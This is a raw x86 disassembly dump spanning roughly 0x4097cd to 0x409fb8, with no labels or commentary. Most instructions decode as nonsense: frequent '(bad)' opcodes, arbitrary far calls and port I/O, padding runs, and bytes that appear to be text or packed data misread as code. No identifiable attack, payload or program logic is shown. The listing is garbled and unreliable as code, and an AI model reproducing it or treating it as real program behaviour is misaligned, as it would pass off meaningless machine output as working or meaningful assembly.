  4097cd:	inc    ecx
  4097ce:	out    0x8d,al
  4097d0:	(bad)  
  4097d1:	clc    
  4097d2:	int3   
  4097d3:	lea    ecx,[ebp-0x727272a3]
  4097d9:	pop    ebp
  4097da:	ins    DWORD PTR es:[edi],dx
  4097db:	and    eax,0x24ee1ac8
  4097e0:	(bad)  
  4097e1:	cmp    DWORD PTR [eax+eax*2-0x34],edi
  4097e5:	push   ecx
  4097e7:	inc    ecx
  4097e8:	sbb    al,0xda
  4097ea:	push   ebx
  4097eb:	jae    0x40984e
  4097ed:	ins    DWORD PTR es:[edi],dx
  4097ee:	outs   dx,DWORD PTR ds:[esi]
  4097ef:	imul   eax,DWORD PTR [ecx+eax*2+0x73],0x63726328
  4097f7:	jb     0x409833
  4097f9:	push   edx
  4097fa:	arpl   WORD PTR [edx+0x53],si
  4097fd:	cmp    ch,BYTE PTR [edi]
  4097ff:	push   ebx
  409800:	jb     0x409855
  409802:	ins    DWORD PTR es:[edi],dx
  409803:	bound  esi,QWORD PTR [ebx+0x73]
  409806:	bound  esi,QWORD PTR [ebp+0x65]
  409809:	outs   dx,BYTE PTR ds:[esi]
  40980a:	jo     0x409850
  40980c:	cmp    al,0x69
  40980e:	je     0x40981d
  409810:	and    BYTE PTR [ecx+0x65],al
  409813:	sub    al,0x6f
  409815:	data16 outs dx,BYTE PTR ds:[esi]
  409817:	jne    0x409869
  409819:	outs   dx,DWORD PTR ds:[esi]
  40981a:	gs jb  0x409886
  40981d:	jae    0x40983f
  40981f:	outs   dx,BYTE PTR ds:[esi]
  409820:	jb     0x409891
  409822:	popa   
  409823:	or     dl,BYTE PTR cs:[edx+0x6e]
  409827:	bound  esp,QWORD PTR [ebp+0x69]
  40982a:	das    
  40982b:	inc    esp
  40982c:	and    BYTE PTR [ebx+0x63],dh
  40982f:	jb     0x409851
  409831:	jae    0x409886
  409833:	inc    ecx
  409834:	outs   dx,DWORD PTR ds:[esi]
  409835:	and    dl,BYTE PTR [edi+0x43]
  409838:	and    BYTE PTR [edx+0x63],dh
  40983b:	jae    0x40987b
  40983d:	arpl   WORD PTR ds:0x2f653e6f,cx
  409843:	das    
  409844:	je     0x409899
  409846:	je     0x4098ad
  409848:	or     eax,0x20207363
  40984d:	outs   dx,BYTE PTR ds:[esi]
  40984e:	gs gs gs cs gs jae 0x4098c1
  409855:	bound  esp,QWORD PTR [eax]
  409857:	gs jb  0x40987a
  40985a:	bound  ebp,QWORD PTR [ebp+0x65]
  40985d:	and    BYTE PTR [ecx+0x76],ch
  409860:	je     0x409891
  409862:	addr16 jae 0x40984a
  409865:	cmc    
  409866:	test   eax,0x750da2cf
  40986b:	lea    eax,[eax]
  40986d:	cli    
  40986e:	adc    BYTE PTR [edi],al
  409870:	je     0x409872
  409872:	add    BYTE PTR [eax],al
  409874:	rcl    ah,cl
  409876:	das    
  409877:	pushf  
  409878:	mov    edx,0xaca2b3cc
  40987d:	lds    ebp,FWORD PTR [ebx+0x34689256]
  409883:	sbb    esi,esi
  409885:	scas   eax,DWORD PTR es:[edi]
  409886:	adc    eax,0xccbf8f97
  40988b:	push   ss
  40988c:	data16 adc BYTE PTR [edx+0x7badcbba],al
  409893:	dec    edi
  409894:	call   0x5d9b:0x359b
	...
  4098a7:	jbe    0x4098e3
  4098a9:	jmp    0xcd0d657a
  4098ae:	int3   
  4098af:	int3   
  4098b0:	int3   
  4098b1:	int3   
  4098b2:	int3   
  4098b3:	mov    ecx,DWORD PTR [ebx+0x3dce38df]
  4098b9:	pop    ebp
  4098ba:	cwde   
  4098bb:	mov    ds:0x9e5b5fc6,al
  4098c0:	xchg   esi,eax
  4098c1:	cmp    dh,BYTE PTR [ecx+0x80e1141]
  4098c7:	xchg   ebx,eax
  4098c8:	ret    0xc626
  4098cb:	into   
  4098cc:	push   ds
  4098cd:	mov    ecx,DWORD PTR [ebx+0x2b344c4a]
  4098d3:	push   esp
  4098d4:	lods   eax,DWORD PTR ds:[esi]
  4098d5:	stos   DWORD PTR es:[edi],eax
  4098d6:	xchg   edi,eax
  4098d7:	push   cs
  4098d8:	cmp    BYTE PTR [ebp-0x74eb7bb6],cl
  4098de:	sub    DWORD PTR [eax],0x6f7b7217
  4098e4:	fisub  DWORD PTR [ebx+eiz*4]
  4098e7:	sbb    BYTE PTR ds:0x8be5ecc7,cl
  4098ed:	mov    esi,esp
  4098ef:	and    al,0xe5
  4098f1:	mov    ecx,DWORD PTR [ebx-0x748a7e97]
  4098f7:	call   DWORD PTR [esi+0x3b]
  4098fa:	jp     0x409949
  4098fc:	mov    cl,0x59
  4098fe:	test   BYTE PTR [ecx-0x668f0c04],0x69
  409905:	test   DWORD PTR [eax],edx
  409907:	das    
  409908:	sub    BYTE PTR [eax],bh
  40990a:	aaa    
  40990b:	push   ss
  40990c:	cs out 0x6,al
  40990f:	mov    esi,0x1bffffff
  409914:	pop    esi
  409915:	(bad)  
  409916:	push   DWORD PTR [edx-0xb2]
  40991c:	(bad)  
  40991d:	(bad)  
  40991e:	(bad)  
  40991f:	(bad)  
  409920:	(bad)  
  409921:	(bad)  
  409922:	(bad)  
  409923:	(bad)  
  409924:	call   FWORD PTR [edi]
  409926:	jno    0x4098fb
  409928:	adc    al,0x30
  40992a:	add    al,0xb2
  40992c:	ins    DWORD PTR es:[edi],dx
  40992d:	jnp    0x4098ed
  40992f:	xor    al,0x10
  409931:	mov    ecx,0x37b220d5
  409936:	xchg   esi,eax
  409937:	retf   0x74a0
  40993a:	clc    
  40993b:	ret    0x8b9
  40993e:	or     BYTE PTR [eax],cl
  409940:	or     BYTE PTR [eax],cl
  409942:	or     BYTE PTR [eax],cl
  409944:	or     BYTE PTR [eax],cl
  409946:	jne    0x4099bd
  409948:	mov    cl,0x4e
  40994a:	popf   
  40994b:	dec    esp
  40994c:	jne    0x4099c3
  40994e:	repz pusha 
  409950:	cwde   
  409951:	retf   
  409952:	outs   dx,BYTE PTR ds:[esi]
  409953:	bndldx (bad),[eax+0x774f500e]
  40995a:	dec    esi
  40995b:	pop    ss
  40995c:	cmp    DWORD PTR [eax+0x3d],0xffffff85
  409960:	mov    BYTE PTR [edx+0xe],bh
  409963:	iret   
  409964:	outs   dx,BYTE PTR ds:[esi]
  409965:	outs   dx,DWORD PTR ds:[esi]
  409966:	add    dl,BYTE PTR [ebp+0x14]
  409969:	pop    edx
  40996a:	arpl   WORD PTR [esi-0x282329b4],ax
  409970:	cmp    dh,BYTE PTR [ebp+0x75]
  409973:	and    dh,BYTE PTR [ebp+0x75]
  409976:	jne    0x4098fa
  409978:	add    BYTE PTR [edi],cl
  40997a:	jne    0x40997b
  40997c:	out    0x71,al
  40997e:	jp     0x4099f3
  409980:	xchg   esp,esp
  409982:	in     al,0xe3
  409984:	adc    BYTE PTR [edx+0x7b],dh
  409987:	addr16 popf 
  409989:	loope  0x4099d1
  40998b:	dec    ebp
  40998c:	stos   DWORD PTR es:[edi],eax
  40998d:	outs   dx,BYTE PTR ds:[esi]
  40998e:	mov    DWORD PTR [ebx-0x61],eax
  409991:	pop    ecx
  409992:	inc    ebx
  409993:	dec    eax
  409994:	(bad)  
  409995:	(bad)  
  409996:	inc    ebx
  409998:	sbb    eax,0x530fbe56
  40999d:	jg     0x4099ab
  40999f:	sbb    DWORD PTR [ecx+0x306c23dd],0xc4ff224e
  4099a9:	or     eax,0x4b29975a
  4099ae:	sbb    DWORD PTR [ecx-0x69],0xffffff9d
  4099b2:	(bad)  
  4099b3:	(bad)  
  4099b5:	(bad)  
  4099b6:	cmp    al,0xe8
  4099b8:	ret    
  4099b9:	(bad)  
  4099ba:	(bad)  
  4099bb:	inc    DWORD PTR [eax]
	...
  4099c5:	mov    edi,DWORD PTR [eax-0x55]
	...
  4099d0:	add    BYTE PTR [eax],al
  4099d2:	add    al,bh
  4099d4:	fldenv [edx-0x71]
  4099d7:	not    BYTE PTR [ebx+0x69b9ff8b]
  4099dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099de:	cmp    al,0xdd
  4099e0:	mov    edi,0xb8d03e93
  4099e5:	lahf   
  4099e6:	in     al,dx
  4099e7:	(bad)  
  4099e8:	sub    bh,BYTE PTR [edx]
  4099ea:	jmp    0x4099ec
  4099ec:	add    BYTE PTR [ebx-0x67ffff75],dh
  4099f2:	clc    
  4099f3:	add    BYTE PTR [eax],al
  4099f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099f6:	jb     0x4099ef
  4099f8:	leave  
  4099f9:	xsha256 (bad)
  4099fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099fb:	adc    eax,0x30aa9d2c
  409a00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a01:	mov    ch,0x4a
  409a03:	ficom  WORD PTR [ebp+ecx*2-0x1ac3c1d9]
  409a0a:	mov    bl,BYTE PTR [edx]
  409a0c:	mov    al,ds:0x35ee0000
  409a11:	outs   dx,DWORD PTR ds:[esi]
  409a12:	push   esi
  409a13:	add    BYTE PTR [eax],al
  409a15:	add    al,ah
  409a17:	pop    ebp
  409a18:	(bad)  
  409a1a:	mov    DWORD PTR [ecx],0xd0fe5d49
  409a20:	pushf  
  409a21:	sub    al,0xfb
  409a23:	(bad)  
  409a24:	push   edi
  409a25:	pmaxsw mm5,QWORD PTR [edx-0x4c7f9c61]
  409a2c:	fcmovbe st,st(3)
  409a2e:	retf   
  409a2f:	mov    al,0x11
  409a31:	jne    0x409a6f
  409a33:	jae    0x409a59
  409a35:	aam    0x4d
  409a37:	rcl    ah,0x0
  409a3a:	add    BYTE PTR [edx+0x76],cl
	...
  409a48:	add    BYTE PTR [edi+eax*1-0x17171752],ah
  409a4f:	call   0xe929833c
  409a54:	call   0x133aa665
  409a59:	fnstcw WORD PTR [ebx-0x4e70c33f]
  409a5f:	xlat   BYTE PTR ds:[ebx]
  409a60:	js     0x409a04
  409a62:	mov    esi,0x1d043247
  409a67:	pop    ds
  409a68:	scas   eax,DWORD PTR es:[edi]
  409a69:	mov    bl,0x65
  409a6b:	lahf   
  409a6c:	mov    cs,esi
  409a6e:	mov    DWORD PTR [esp+ecx*1],ecx
  409a71:	jle    0x409a06
  409a73:	xor    BYTE PTR [edx+0x17],bh
  409a76:	ins    BYTE PTR es:[edi],dx
  409a77:	cdq    
  409a78:	sub    BYTE PTR [edx+0x6181fbff],bl
  409a7e:	imul   ebx,DWORD PTR [eax+edx*8+0x123f401f],0xb55bbd04
  409a89:	xor    edi,DWORD PTR [esi]
  409a8b:	push   edx
  409a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a8e:	or     al,0xc
  409a90:	das    
  409a91:	jbe    0x409a7f
  409a93:	or     al,0xc
  409a95:	or     DWORD PTR [esp+edi*2+0xc],0x45
  409a9a:	pop    ebx
  409a9b:	je     0x409b14
  409a9d:	je     0x409acd
  409a9f:	adc    cl,BYTE PTR [eax+0x18618d7d]
  409aa5:	push   0xa43e1fb8
  409aaa:	pushf  
  409aab:	cli    
  409aac:	int    0x12
  409aae:	mov    ?,ecx
  409ab0:	div    BYTE PTR [esi-0x69bababb]
  409ab6:	out    dx,eax
  409ab7:	inc    ebp
  409ab8:	inc    ebp
  409ab9:	or     dl,ah
  409abb:	inc    ebp
  409abc:	inc    ebp
  409abd:	inc    ebp
	...
  409ac6:	add    BYTE PTR [ebx+0x78],cl
  409ac9:	mov    edx,0x2c4a3a6a
  409ace:	jmp    0x409a56
  409ad0:	mov    al,0x42
  409ad2:	rcl    BYTE PTR [eax],1
  409ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ad5:	(bad)  
  409ad6:	(bad)  
  409ad7:	sbb    edi,DWORD PTR [edx]
  409ad9:	and    DWORD PTR [eax-0x3dbede3],ebp
	...
  409ae7:	add    bh,bh
  409ae9:	push   DWORD PTR [ebx-0xcc8974]
  409aef:	push   eax
  409af1:	xor    eax,0xd0030595
  409af6:	daa    
  409af7:	repz callw 0x46d9
  409afc:	pushf  
  409afd:	loopne 0x409a84
  409aff:	inc    BYTE PTR [eax]
  409b01:	push   esi
  409b02:	mov    ebp,0x960c32e3
  409b07:	loop   0x409abe
  409b09:	ret    
  409b0a:	jae    0x409b72
  409b0c:	add    esi,DWORD PTR [ecx+edi*1+0x6250019b]
  409b13:	(bad)  
  409b14:	inc    esp
  409b16:	push   edi
  409b17:	(bad)  
  409b18:	dec    DWORD PTR [ecx-0x52]
  409b1b:	push   ds
  409b1c:	inc    DWORD PTR [edi+eiz*8]
  409b1f:	inc    ebx
  409b20:	mov    ah,0xab
  409b22:	mov    fs,edx
  409b24:	sbb    DWORD PTR [eax],eax
  409b26:	enter  0x7ce,0xa9
  409b2a:	mov    esi,0xde0c5f0
  409b2f:	addr16 (bad) 
  409b31:	outs   dx,BYTE PTR ds:[esi]
  409b32:	adc    edx,ebp
  409b34:	and    al,0xf8
  409b36:	add    al,0x4
  409b38:	add    al,0xdb
  409b3a:	addr16 gs inc esi
  409b3d:	popf   
  409b3e:	and    eax,esi
  409b40:	frstor [ebp-0x6a]
  409b43:	mov    ebp,0x4a48910e
  409b48:	push   esp
  409b49:	sub    DWORD PTR [esp+eax*8],esp
  409b4c:	shl    DWORD PTR [edx+ebp*2],1
  409b4f:	loope  0x409ba8
  409b51:	sbb    BYTE PTR [esi+0x4b4dfd6],dh
  409b57:	add    al,0x8c
  409b59:	cmp    BYTE PTR [esp+eax*1+0x4],0x4
	...
  409b66:	add    BYTE PTR [edi-0x747446f2],cl
  409b6c:	mov    ecx,DWORD PTR [ebx-0x74747475]
  409b72:	mov    eax,DWORD PTR [eax]
  409b74:	add    BYTE PTR [ebx],cl
  409b76:	pop    esi
  409b77:	sbb    dh,BYTE PTR [eax-0x52ca8c2a]
  409b7d:	arpl   cx,sp
  409b7f:	adc    al,0x6e
  409b81:	rdpmc  
  409b83:	adc    DWORD PTR [esi-0x7e67b1be],edi
  409b89:	push   ds
  409b8a:	pop    ss
  409b8b:	adc    eax,0xba000065
  409b90:	je     0x409b92
  409b92:	add    BYTE PTR [edx-0x7],ah
  409b95:	add    BYTE PTR [eax],al
  409b97:	popw   ds
  409b99:	push   ebp
  409b9a:	push   esi
  409b9b:	mov    esi,0x6c1eefbc
  409ba0:	pminub mm2,mm3
  409ba3:	jae    0x409bd9
  409ba5:	or     ah,BYTE PTR [ebp-0x10]
  409ba8:	mov    esi,0x265bf93b
  409bad:	or     bh,BYTE PTR [eax-0x5b01fc00]
  409bb3:	sahf   
  409bb4:	bound  eax,QWORD PTR [esp+eax*1]
  409bb7:	add    al,0xd7
  409bb9:	or     BYTE PTR [esi],bh
  409bbb:	push   esi
  409bbc:	fucom  st(1)
  409bbe:	(bad)  
  409bbf:	sbb    BYTE PTR [edx+0x4b2c7ac6],bl
  409bc5:	cld    
  409bc6:	test   eax,0x57605bb5
  409bcb:	mov    esi,0xd4838919
  409bd0:	ja     0x409bbc
  409bd2:	rcr    eax,cl
  409bd4:	mov    fs,WORD PTR [ebp+0x55d39159]
  409bda:	mov    cl,0x4
  409bdc:	add    al,0x19
  409bde:	dec    edx
  409bdf:	add    al,0x4
  409be1:	add    al,0xc0
  409be3:	rol    al,0xc0
  409be6:	rol    al,0xc0
  409be9:	rol    al,0xb
  409bec:	mov    DWORD PTR [eax],ebp
  409bee:	(bad)  
  409bef:	(bad)  
  409bf0:	(bad)  
  409bf1:	(bad)  
  409bf2:	(bad)  
  409bf3:	(bad)  
  409bf4:	(bad)  
  409bf5:	(bad)  
  409bf6:	jmp    DWORD PTR [esp+ebp*2+0x6c]
  409bfa:	inc    esp
  409bfb:	and    BYTE PTR [esi],ch
  409bfd:	or     eax,0x65655370
  409c02:	ins    DWORD PTR es:[edi],dx
  409c03:	jae    0x409c6a
  409c05:	gs je  0x409c36
  409c08:	jb     0x409c7d
  409c0a:	cmp    ch,BYTE PTR [esi]
  409c0c:	ins    DWORD PTR es:[edi],dx
  409c0d:	outs   dx,DWORD PTR ds:[esi]
  409c0e:	jae    0x409c83
  409c10:	ins    WORD PTR es:[edi],dx
  409c12:	je     0x409c34
  409c14:	gs jb  0x409c64
  409c17:	or     eax,0x452e4165
  409c1c:	or     eax,0x743e745b
  409c21:	das    
  409c22:	cs gs cs gs jb 0x409c9c
  409c28:	gs popa 
  409c2a:	addr16 gs jae 0x409c9b
  409c2e:	je     0x409c5e
  409c30:	and    BYTE PTR [ebp+0x74],ah
  409c33:	bound  ebp,QWORD PTR [esi+0x73]
  409c36:	fs addr16 js 0x409c68
  409c3a:	inc    esp
  409c3b:	outs   dx,DWORD PTR ds:[esi]
  409c3c:	cmp    ch,BYTE PTR [edi]
  409c3e:	ins    DWORD PTR es:[edi],dx
  409c3f:	jae    0x409cac
  409c41:	or     eax,0xa206d52
  409c46:	push   ebx
  409c47:	push   ebx
  409c48:	jae    0x409cc0
  409c4a:	je     0x409cae
  409c4c:	jae    0x409c88
  409c4e:	outs   dx,DWORD PTR ds:[esi]
  409c4f:	push   0x202e436f
  409c54:	das    
  409c55:	or     eax,0x6920
  409c5a:	jmp    0x7759b6ba
  409c5f:	lods   al,BYTE PTR ds:[esi]
  409c60:	cwde   
  409c61:	ds sub eax,0xde882d21
  409c67:	cmp    DWORD PTR [eax-0x36ac3f15],esi
  409c6d:	add    eax,0x97d525f3
  409c72:	add    BYTE PTR [eax],al
  409c74:	add    al,0x2d
  409c76:	push   esp
  409c77:	xchg   DWORD PTR [eax+ebp*4+0x73db4c6a],ebx
  409c7e:	out    0x9c,al
  409c80:	sbb    BYTE PTR [esi-0x7e946c12],dl
  409c86:	jnp    0x409cc4
  409c88:	mov    dh,0x9a
  409c8a:	pop    edx
  409c8b:	popa   
  409c8c:	xor    BYTE PTR [esi+ebx*2],bh
  409c8f:	sbb    edi,edi
  409c91:	add    BYTE PTR [eax],al
  409c93:	sub    eax,0xc9c1
  409c98:	mov    BYTE PTR [eax],dl
  409c9a:	push   ss
  409c9b:	add    BYTE PTR [ebp+0x1e],al
  409c9e:	mov    al,0x65
  409ca0:	dec    esp
  409ca1:	adc    al,0x75
  409ca3:	xor    BYTE PTR [eax],0x44
  409ca6:	shr    BYTE PTR [edi-0x1ebba700],0x5d
  409cad:	push   ss
  409cae:	push   ebp
  409caf:	jno    0x409c8b
  409cb1:	popf   
  409cb2:	shl    BYTE PTR [ebx],cl
  409cb4:	call   0x4505:0x26454545
  409cbb:	inc    ebp
  409cbc:	(bad)  
  409cbd:	std    
  409cbe:	inc    ebp
  409cbf:	inc    ebp
  409cc0:	inc    ebp
  409cc1:	(bad)  
  409cc2:	(bad)  
  409cc3:	(bad)  
  409cc4:	(bad)  
  409cc5:	(bad)  
  409cc6:	(bad)  
  409cc7:	pfmax  mm1,QWORD PTR [edi]
  409ccb:	loope  0x409cf7
  409ccd:	stos   BYTE PTR es:[edi],al
  409cce:	mov    eax,eax
  409cd0:	xchg   edx,eax
  409cd1:	add    eax,0x3d07f0d7
  409cd6:	adc    DWORD PTR [ecx-0x3e624631],esi
  409cdc:	mov    bh,BYTE PTR [esi+0x6671abf8]
	...
  409cea:	add    BYTE PTR [eax],al
  409cec:	add    BYTE PTR [ecx+0x5b],ch
  409cef:	cwde   
  409cf0:	mov    al,0x0
  409cf2:	add    ah,ch
  409cf4:	das    
  409cf5:	outs   dx,DWORD PTR ds:[esi]
  409cf6:	out    0x9c,al
  409cf8:	add    edx,edi
  409cfa:	les    ebx,FWORD PTR ds:0xe35b875f
  409d00:	test   BYTE PTR [ebp-0x2d],bl
  409d03:	imul   eax,DWORD PTR [eax+0x46],0x290127b8
  409d0a:	iret   
  409d0b:	add    eax,0x84786784
  409d10:	dec    esp
  409d11:	int3   
  409d12:	shl    BYTE PTR [edi+0x3ae2],0xa4
  409d19:	cld    
  409d1a:	add    BYTE PTR [eax],al
  409d1c:	push   ebx
  409d1d:	lods   al,BYTE PTR ds:[esi]
  409d1e:	rol    DWORD PTR [eax],cl
  409d20:	test   DWORD PTR ds:0xd61e964b,eax
  409d26:	ins    DWORD PTR es:[edi],dx
  409d27:	fidiv  WORD PTR [edi-0x38]
  409d2a:	push   edx
  409d2b:	adc    al,BYTE PTR [edi+eiz*1-0x1661d9d3]
  409d32:	mov    esi,0x932e24b1
  409d37:	daa    
  409d38:	pop    esi
  409d39:	test   DWORD PTR [ebp+0x6c461385],eax
  409d3f:	or     ax,WORD PTR [edx+0x541a258c]
  409d46:	xor    DWORD PTR [edi],ebx
  409d48:	xor    DWORD PTR [esi],0x27
  409d4b:	push   esp
  409d4c:	push   ds
  409d4d:	cmp    DWORD PTR [esi+0x1e],esi
  409d50:	(bad)  
  409d51:	sub    esp,esp
  409d53:	and    bl,BYTE PTR [ebp+edi*2+0x73]
  409d57:	mov    BYTE PTR [esi],al
  409d59:	test   DWORD PTR [ebp-0x7a15429f],eax
  409d5f:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  409d65:	test   DWORD PTR [ebp-0x247a7a7b],eax
  409d6b:	ret    
  409d6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  409d75:	add    bh,bh
  409d77:	jmp    edi
  409d79:	xlat   BYTE PTR ds:[ebx]
  409d7a:	pop    ds
  409d7b:	call   0x9c6f:0xf9eb2213
  409d82:	add    ecx,DWORD PTR [esi+0x7bc04c]
  409d88:	out    0x62,eax
  409d8a:	sub    al,0x7f
  409d8c:	out    dx,eax
  409d8d:	cwde   
  409d8e:	xor    al,0x25
  409d90:	(bad)  
  409d91:	push   esp
  409d93:	pop    edx
  409d94:	(bad)  
  409d95:	(bad)  
  409d96:	in     al,dx
  409d97:	das    
  409d98:	(bad)  
  409d99:	push   DWORD PTR [ebx+0x29044848]
  409d9f:	js     0x409d3f
  409da1:	cs mov ebx,0xb154d14a
  409da7:	cmp    bl,BYTE PTR ds:0xc1f6ba8d
  409dad:	add    al,bh
  409daf:	es push esp
  409db1:	pop    eax
  409db2:	dec    esp
  409db4:	popf   
  409db5:	xchg   ecx,eax
  409db6:	mov    ah,0x42
  409db8:	int3   
  409db9:	int3   
  409dba:	int3   
  409dbb:	out    0xef,al
  409dbd:	sub    al,0xbe
  409dbf:	push   ecx
  409dc0:	adc    eax,0x40a8ed3c
  409dc5:	(bad)  
  409dc6:	cdq    
  409dc7:	sub    BYTE PTR [esi-0x36],bl
  409dca:	jmp    0x409dbf
  409dcc:	test   eax,0x29ff89c9
  409dd1:	in     al,0x85
  409dd3:	in     eax,0x84
  409dd5:	pusha  
  409dd6:	sub    al,0x54
  409dd8:	out    dx,eax
  409dd9:	pop    ebx
  409dda:	fcmovu st,st(0)
  409ddc:	repnz cdq 
  409dde:	int3   
  409ddf:	int3   
  409de0:	jp     0x409dba
  409de2:	int3   
  409de3:	int3   
  409de4:	int3   
  409de5:	lea    ecx,[ebp-0x72727273]
  409deb:	lea    ecx,[ebp-0x87b1273]
	...
  409df9:	add    BYTE PTR [ebp+0x75],dh
  409dfc:	scas   eax,DWORD PTR es:[edi]
  409dfd:	push   es
  409dfe:	jge    0x409e49
  409e00:	test   DWORD PTR es:[eax],edi
  409e03:	dec    edx
  409e04:	dec    ebx
  409e05:	js     0x409d8a
  409e07:	ret    0xee0e
  409e0a:	add    ah,0xb6
  409e0d:	mov    bl,0xfd
  409e0f:	xchg   edx,eax
  409e10:	mov    ch,0xf4
  409e12:	mov    edi,0x3375754e
  409e17:	mov    WORD PTR cs:[ebx+0x384ae54f],cs
  409e1e:	sbb    cl,BYTE PTR [esi-0x69]
  409e21:	push   esi
  409e22:	jge    0x409e8b
  409e24:	or     al,0x9
  409e26:	inc    ebp
  409e27:	leave  
  409e28:	hlt    
  409e29:	cmp    BYTE PTR [ecx-0x7b],0xb
  409e2d:	or     edi,DWORD PTR [esi-0x1acec4b]
  409e33:	jne    0x409eaa
  409e35:	jle    0x409e58
  409e37:	out    dx,eax
  409e38:	jne    0x409eaf
  409e3a:	jb     0x409e18
  409e3c:	push   cs
  409e3d:	jne    0x409e72
  409e3f:	xchg   edi,eax
  409e40:	int    0xc4
  409e42:	xor    DWORD PTR [eax-0x61],edi
  409e45:	jno    0x409e3b
  409e47:	inc    esp
  409e48:	mov    bh,0x9c
  409e4a:	lods   eax,DWORD PTR ds:[esi]
  409e4b:	mov    ebx,0x1d46af5c
  409e50:	sbb    eax,0x1000b813
  409e55:	scas   eax,DWORD PTR es:[edi]
  409e56:	fidiv  DWORD PTR [ebx]
  409e58:	xor    esi,DWORD PTR [ebx]
  409e5a:	mov    bl,0x5a
  409e5c:	xor    esi,DWORD PTR [ebx]
  409e5e:	retf   
  409e5f:	repnz xor esi,DWORD PTR [ebx]
  409e62:	xor    esp,DWORD PTR [esp]
  409e65:	and    al,0x24
  409e67:	and    al,0x24
  409e69:	and    al,0x24
  409e6b:	and    al,0x3a
  409e6d:	retf   
  409e6e:	adc    al,0x16
  409e70:	fdiv   QWORD PTR [ebp-0x445abf94]
  409e76:	push   ebp
  409e77:	loopne 0x409e46
  409e79:	mov    eax,ds:0xd73d5598
  409e7e:	cmp    DWORD PTR [esi],eax
  409e80:	fwait
  409e81:	mov    WORD PTR [edx],?
  409e83:	pop    ebx
  409e84:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  409e8b:	add    DWORD PTR [ebx-0x40ca0001],0xffffff8d
  409e92:	repnz (bad) 
  409e94:	jmp    DWORD PTR [eax-0x3d]
  409e97:	cmp    al,BYTE PTR [edx-0x3]
  409e9a:	rcr    DWORD PTR [edi],cl
  409e9c:	push   cs
  409e9d:	mov    al,0xba
  409e9f:	mov    bl,0x4e
  409ea1:	mov    edi,0xd86faa5c
  409ea6:	push   ss
  409ea7:	pop    es
  409ea8:	popa   
  409ea9:	mov    esp,0x2a611ed9
  409eae:	sub    ebx,edi
  409eb0:	jmp    0x7273:0x231ea99b
  409eb7:	inc    edi
  409eb8:	(bad)  
  409eb9:	call   DWORD PTR [ebx]
  409ebb:	add    bh,bh
  409ebd:	(bad)  
  409ebe:	jns    0x409e49
  409ec0:	js     0x409ec1
  409ec2:	mov    ecx,DWORD PTR [edx-0x38a469c1]
  409ec8:	jns    0x409ebb
  409eca:	xlat   BYTE PTR ds:[ebx]
  409ecb:	xchg   ebx,eax
  409ecc:	sbb    eax,0xd9623f05
  409ed1:	jmp    0x97fb:0xa1d6a1ee
  409ed8:	mov    cl,0x6d
  409eda:	cdq    
  409edb:	mov    ecx,DWORD PTR [ebx-0x7a50d375]
  409ee1:	aam    0xec
  409ee3:	sub    DWORD PTR [eax+0xf6f3c3e],esp
  409ee9:	clc    
  409eea:	mov    ?,WORD PTR [ebx-0x31]
  409eed:	in     al,0xe
  409eef:	jle    0x409ee8
  409ef1:	push   edx
  409ef2:	cmc    
  409ef3:	sbb    BYTE PTR [ebx+0xf],bh
  409ef6:	push   edx
  409ef7:	mov    DWORD PTR [edi-0x6f],ecx
  409efa:	sub    al,0x8b
  409efc:	mov    eax,DWORD PTR [ecx]
  409efe:	cmc    
  409eff:	mov    cl,0x8b
  409f01:	mov    ecx,DWORD PTR [ebx+0x0]
  409f07:	add    BYTE PTR [eax],al
  409f09:	add    BYTE PTR [eax],al
  409f0b:	add    BYTE PTR ds:0xbaf6,cl
  409f11:	add    BYTE PTR [eax],al
  409f13:	add    BYTE PTR [eax],al
  409f15:	add    BYTE PTR [eax],al
  409f17:	add    BYTE PTR [ebp+0x3126185],al
  409f1d:	imul   esi,DWORD PTR [ecx-0x30],0x25
  409f21:	mov    dl,0x72
  409f23:	or     ah,BYTE PTR [edx]
  409f25:	das    
  409f26:	jae    0x409f93
  409f28:	jne    0x409f9c
  409f2a:	gs cs gs gs push ebx
  409f2f:	and    BYTE PTR gs:[ecx+0x72],ch
  409f33:	and    BYTE PTR [edx+esi*2],bh
  409f36:	or     eax,0x65752f20
  409f3b:	or     eax,0x7276660d
  409f40:	dec    ebp
  409f41:	arpl   WORD PTR [esi+0x69],bp
  409f44:	je     0x409f93
  409f46:	cs je  0x409fac
  409f49:	imul   esp,DWORD PTR [eax],0x6d2e733c
  409f4f:	cmp    al,0x76
  409f51:	inc    ecx
  409f52:	bound  esp,QWORD PTR [edx+edi*2+0x69]
  409f56:	and    BYTE PTR [ebp+0x74],ah
  409f59:	jb     0x409fad
  409f5b:	and    BYTE PTR cs:[edi+0x3e],ah
  409f5f:	cs jbe 0x409f82
  409f62:	and    BYTE PTR [ebx+esi*2+0x3c],dh
  409f66:	jns    0x409fdb
  409f68:	outs   dx,DWORD PTR ds:[esi]
  409f69:	or     ah,BYTE PTR [ebx+0x76]
  409f6c:	and    dh,BYTE PTR [ebp+0x70]
  409f6f:	jae    0x409fc4
  409f71:	and    BYTE PTR [esi],ch
  409f73:	or     eax,0x206d6c20
  409f78:	fs gs gs das 
  409f7c:	inc    ebx
  409f7d:	outs   dx,BYTE PTR ds:[esi]
  409f7e:	or     dh,BYTE PTR [ebx+0x63]
  409f81:	ret    
  409f82:	out    dx,eax
  409f83:	sbb    al,BYTE PTR [esi]
  409f85:	mov    ch,0x90
  409f87:	cmp    DWORD PTR [ecx+0x4a4fd143],ebx
  409f8d:	mov    cl,0xd5
  409f8f:	xlat   BYTE PTR ds:[ebx]
  409f90:	fld    DWORD PTR [ebp-0x7a378d7b]
  409f96:	test   edi,ecx
  409f98:	pusha  
  409f99:	test   DWORD PTR [ebp+0x2bb2c541],eax
  409f9f:	sub    eax,0x18b5c910
  409fa4:	(bad)  
  409fa5:	mov    ecx,0x11b39290
  409faa:	call   0x25effadf
  409faf:	test   DWORD PTR [eax+0x65],eax
  409fb2:	scas   al,BYTE PTR es:[edi]
  409fb3:	test   DWORD PTR [eax],eax
  409fb5:	out    0xde,al
  409fb7:	pop    es
  409fb8:	mov    ch,0x0
